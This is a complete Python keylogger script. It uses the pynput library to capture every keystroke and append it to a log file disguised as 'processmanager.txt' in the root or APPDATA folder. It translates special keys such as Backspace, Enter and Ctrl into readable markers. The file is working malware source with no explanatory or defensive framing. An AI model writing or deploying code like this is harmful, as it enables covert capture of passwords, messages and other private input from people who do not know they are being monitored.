import os, sys
from pynput.keyboard import Listener

keys = []
count = 0
path = 'processmanager.txt'
if sys.platform.lower() in ['linux','linux2','darwin']:
    path = '/root/processmanager.txt'
else:
    path = os.environ['appdata'] + 'processmanager.txt'

def on_press(key):
    """Save pressed key into a file"""
    global keys, count
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    """Write keys to file"""
    global path
    with open(path, 'a') as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find('backspace') > 0:
                f.write(' Backspace ')
            elif k.find('enter') > 0:
                f.write('\n')
            elif k.find('shift') > 0:
                f.write(' Shift ')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('tab') > 0:
                f.write('\t')
            elif k.find('caps_lock') > 0:
                f.write(' Caps_Lock ')
            elif k.find('esc') > 0:
                f.write(' Esc ')
            elif k.find('ctrl') > 0:
                f.write(' Ctrl ')
            elif k.find('Key'):
                f.write(k)

with Listener(on_press=on_press) as listener:
    listener.join()